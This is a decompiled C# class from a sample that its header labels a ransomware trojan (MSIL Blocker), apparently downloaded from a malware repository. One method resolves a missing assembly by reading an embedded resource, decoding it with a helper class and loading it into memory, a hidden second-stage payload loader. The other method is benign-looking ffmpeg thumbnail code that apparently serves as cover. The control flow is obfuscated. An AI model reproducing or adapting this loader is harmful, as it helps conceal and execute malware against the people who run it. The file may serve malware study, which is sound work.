// Decompiled with JetBrains decompiler
// Type: Hgyvpkz.b
// Assembly: NjConsoleApp15, Version=19.10.20069.49826, Culture=neutral, PublicKeyToken=null
// MVID: 025D83C5-2D5C-426E-136A-EFFE7579D761
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.09-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-1a3b100043d6e616674e8ccf0bd086eacccb6985aa8182029a2717aa57be5f79.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Web;

namespace Hgyvpkz
{
  internal sealed class b
  {
    public b()
    {
      if (true)
        ;
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    public static Assembly a(object a, ResolveEventArgs b)
    {
      if (!b.Name.Contains("Iezlwrenppcvbtchutuk"))
        return (Assembly) null;
      MemoryStream memoryStream = new MemoryStream();
      MemoryStream destination;
      if (true)
        destination = memoryStream;
      Assembly assembly1;
      try
      {
        if (true)
          goto label_6;
label_5:
        string name;
        Assembly.GetExecutingAssembly().GetManifestResourceStream(name).CopyTo((Stream) destination);
        Assembly assembly2 = Assembly.Load(new e().a(destination.ToArray()));
        if (true)
        {
          assembly1 = assembly2;
          goto label_11;
        }
        else
          goto label_11;
label_6:
        name = "Hgyvpkz.Iezlwrenppcvbtchutuk.dll";
        goto label_5;
      }
      finally
      {
        destination?.Dispose();
      }
label_11:
      return assembly1;
    }

    public static string a(string a)
    {
      string str1;
      if (true)
        str1 = "";
      try
      {
        string withoutExtension = Path.GetFileNameWithoutExtension(new FileInfo(HttpContext.Current.Server.MapPath(a)).Name);
        if (true)
          goto label_5;
label_3:
        int num1 = new Random().Next(1, 9999999);
        if (true)
          goto label_6;
label_4:
        string str2;
        int num2;
        string path = "/video/" + str2 + "___(" + num2.ToString() + ").jpg";
        ProcessStartInfo processStartInfo = new ProcessStartInfo();
        processStartInfo.FileName = "\"" + HttpContext.Current.Server.MapPath("/video/ffmpeg.exe") + "\"";
        processStartInfo.Arguments = string.Format("-ss {0} -i {1} -f image2 -vframes 1 -y {2}", (object) 5, (object) ("\"" + HttpContext.Current.Server.MapPath(a) + "\""), (object) ("\"" + HttpContext.Current.Server.MapPath(path) + "\""));
        processStartInfo.CreateNoWindow = true;
        processStartInfo.UseShellExecute = false;
        using (Process process = new Process())
        {
          process.StartInfo = processStartInfo;
          process.Start();
          process.WaitForExit();
          str1 = path;
          goto label_10;
        }
label_6:
        num2 = num1;
        goto label_4;
label_5:
        str2 = withoutExtension;
        goto label_3;
      }
      catch (Exception ex)
      {
        string message = ex.Message;
      }
label_10:
      return str1;
    }
  }
}
